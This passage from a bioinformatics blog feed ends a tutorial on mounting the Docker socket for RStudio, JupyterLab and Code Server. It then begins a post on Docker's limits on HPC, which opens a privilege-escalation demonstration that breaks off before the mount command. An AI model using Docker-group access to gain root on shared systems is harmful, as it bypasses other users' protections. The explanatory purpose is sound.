class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">command</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> /bin/sh </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">c "echo 'Data container for shared volumes'"</span><br></span></code></pre></div></div>
<p><strong>Run all services:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker-compose</span><span class="token plain"> up </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Access:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># RStudio: http://localhost:8787</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># JupyterLab: http://localhost:8888</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Code Server: https://localhost:8443</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="7-important-considerations-for-dood">7. Important Considerations for DooD<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#7-important-considerations-for-dood" class="hash-link" aria-label="Direct link to 7. Important Considerations for DooD" title="Direct link to 7. Important Considerations for DooD" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="71-security-considerations">7.1. Security Considerations<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#71-security-considerations" class="hash-link" aria-label="Direct link to 7.1. Security Considerations" title="Direct link to 7.1. Security Considerations" translate="no">​</a></h3>
<p><strong>File Permissions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Files created in Docker containers may have root ownership</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run containers with explicit user mapping</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run as host user</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ubuntu:22.04 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> /data/file.txt</span><br></span></code></pre></div></div>
<p><strong>Docker Daemon Access:</strong></p>
<p>⚠️ <strong>Warning</strong>: Mounting <code>/var/run/docker.sock</code> allows full Docker daemon access. Only do this in:</p>
<ul>
<li class="">Development environments</li>
<li class="">Trusted internal systems</li>
<li class="">Your own workstation</li>
<li class="">Controlled team environments</li>
</ul>
<p>⚠️ <strong>Do NOT</strong> expose this to untrusted users or the public internet.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="72-resource-management">7.2. Resource Management<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#72-resource-management" class="hash-link" aria-label="Direct link to 7.2. Resource Management" title="Direct link to 7.2. Resource Management" translate="no">​</a></h3>
<p><strong>Limit container resources:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cpus</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> 16g </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  rocker/tidyverse:latest</span><br></span></code></pre></div></div>
<p><strong>In docker-compose:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">services</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">rstudio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> rocker/tidyverse</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">deploy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">resources</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">limits</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">cpus</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'4'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> 16G</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">reservations</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">cpus</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'2'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> 8G</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="73-volume-management">7.3. Volume Management<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#73-volume-management" class="hash-link" aria-label="Direct link to 7.3. Volume Management" title="Direct link to 7.3. Volume Management" translate="no">​</a></h3>
<p><strong>Best practices for shared volumes:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create named volume for data persistence</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> volume create analysis-data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount in multiple containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> analysis-data:/data rstudio</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> analysis-data:/data jupyter</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> analysis-data:/data code-server</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="8-troubleshooting">8. Troubleshooting<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#8-troubleshooting" class="hash-link" aria-label="Direct link to 8. Troubleshooting" title="Direct link to 8. Troubleshooting" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="81-docker-socket-permission-denied">8.1. Docker Socket Permission Denied<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#81-docker-socket-permission-denied" class="hash-link" aria-label="Direct link to 8.1. Docker Socket Permission Denied" title="Direct link to 8.1. Docker Socket Permission Denied" translate="no">​</a></h3>
<p><strong>Problem:</strong> <code>Cannot connect to Docker daemon</code></p>
<p><strong>Solution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check Docker socket permissions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-la</span><span class="token plain"> /var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add current user to docker group</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">usermod</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-aG</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">newgrp </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or run container with docker group</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --group-add </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">getent group </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d: </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f3</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  rocker/tidyverse:latest</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="82-file-permission-issues">8.2. File Permission Issues<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#82-file-permission-issues" class="hash-link" aria-label="Direct link to 8.2. File Permission Issues" title="Direct link to 8.2. File Permission Issues" translate="no">​</a></h3>
<p><strong>Problem:</strong> Cannot modify files created by Docker containers</p>
<p><strong>Solution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run containers with user/group mapping</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  rocker/tidyverse:latest</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="83-volume-mount-not-visible">8.3. Volume Mount Not Visible<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#83-volume-mount-not-visible" class="hash-link" aria-label="Direct link to 8.3. Volume Mount Not Visible" title="Direct link to 8.3. Volume Mount Not Visible" translate="no">​</a></h3>
<p><strong>Problem:</strong> Files in mounted volumes aren't visible from web app</p>
<p><strong>Solution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify volume is mounted</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> inspect rstudio-container </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> Mounts</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use absolute paths</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Full path required</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  rocker/tidyverse:latest</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="9-summary">9. Summary<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#9-summary" class="hash-link" aria-label="Direct link to 9. Summary" title="Direct link to 9. Summary" translate="no">​</a></h2>
<p>Docker out of Docker is the ideal approach for running interactive web applications that need to spawn containerized bioinformatics tools. It provides:</p>
<p>✅ <strong>Performance</strong> - No nested daemon overhead</p>
<p>✅ <strong>Simplicity</strong> - Just mount the Docker socket</p>
<p>✅ <strong>Functionality</strong> - Full Docker CLI access from within the web app</p>
<p>✅ <strong>Data Sharing</strong> - Seamless volume access between containers</p>
<p><strong>Key Points:</strong></p>
<ul>
<li class="">Mount <code>/var/run/docker.sock</code> to enable DooD</li>
<li class="">Mount data volumes for file sharing</li>
<li class="">Use for RStudio, JupyterLab, Code Server workflows</li>
<li class="">Perfect for local development and trusted team environments</li>
<li class="">Combine with docker-compose for multi-app setups</li>
</ul>
<p>Start with the simple examples in this post, and scale up to complex multi-container bioinformatics workflows!</p>
<hr>
<p><strong>Related Reading:</strong></p>
<ul>
<li class=""><a class="" href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer">Containers on HPC: From Docker to Singularity and Apptainer</a></li>
<li class=""><a href="https://www.nextflow.io/docs/latest/container.html" target="_blank" rel="noopener noreferrer" class="">Nextflow Best Practices</a></li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="docker" term="docker"/>
        <category label="containers" term="containers"/>
        <category label="rstudio" term="rstudio"/>
        <category label="jupyterlab" term="jupyterlab"/>
        <category label="code-server" term="code-server"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="reproducibility" term="reproducibility"/>
        <category label="web-apps" term="web-apps"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Containers on HPC: From Docker to Singularity and Apptainer]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer</id>
        <link href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer"/>
        <updated>2026-02-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Container technologies have revolutionized software deployment and reproducibility in scientific computing. However, traditional Docker faces significant limitations in High-Performance Computing (HPC) environments. This post explores why Docker struggles on HPC systems and introduces modern alternatives like Docker rootless, Singularity, and Apptainer.]]></summary>
        <content type="html"><![CDATA[<p>Container technologies have revolutionized software deployment and reproducibility in scientific computing. However, traditional Docker faces significant limitations in High-Performance Computing (HPC) environments. This post explores why Docker struggles on HPC systems and introduces modern alternatives like Docker rootless, Singularity, and Apptainer.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-docker-problem-on-hpc-systems">The Docker Problem on HPC Systems<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#the-docker-problem-on-hpc-systems" class="hash-link" aria-label="Direct link to The Docker Problem on HPC Systems" title="Direct link to The Docker Problem on HPC Systems" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-docker-doesnt-work-for-normal-users">Why Docker Doesn't Work for Normal Users<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#why-docker-doesnt-work-for-normal-users" class="hash-link" aria-label="Direct link to Why Docker Doesn't Work for Normal Users" title="Direct link to Why Docker Doesn't Work for Normal Users" translate="no">​</a></h3>
<p>Docker is powerful, but it comes with a critical security model that makes it problematic for shared HPC systems:</p>
<p><strong>Docker requires root privileges</strong> to run containers. This is because Docker's daemon operates at the system level and needs elevated permissions to:</p>
<ul>
<li class="">Create network namespaces</li>
<li class="">Mount filesystems</li>
<li class="">Manage storage drivers</li>
<li class="">Access hardware resources</li>
</ul>
<p>On HPC systems with many users sharing resources, giving Docker access to all users would be a security nightmare. A user with Docker access could:</p>
<ul>
<li class="">Escalate privileges to root</li>
<li class="">Access other users' data through container mounts</li>
<li class="">Consume unlimited system resources</li>
<li class="">Bypass resource quotas and scheduling policies</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-example-docker-privilege-escalation">Real Example: Docker Privilege Escalation<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#real-example-docker-privilege-escalation" class="hash-link" aria-label="Direct link to Real Example: Docker Privilege Escalation" title="Direct link to Real Example: Docker Privilege Escalation" translate="no">​</a></h3>
<p>Here's a concrete demonstration of how a regular user can escalate to root privileges using Docker:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># A normal user with docker group membership</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: regularuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># User runs a container and mounts the entire root 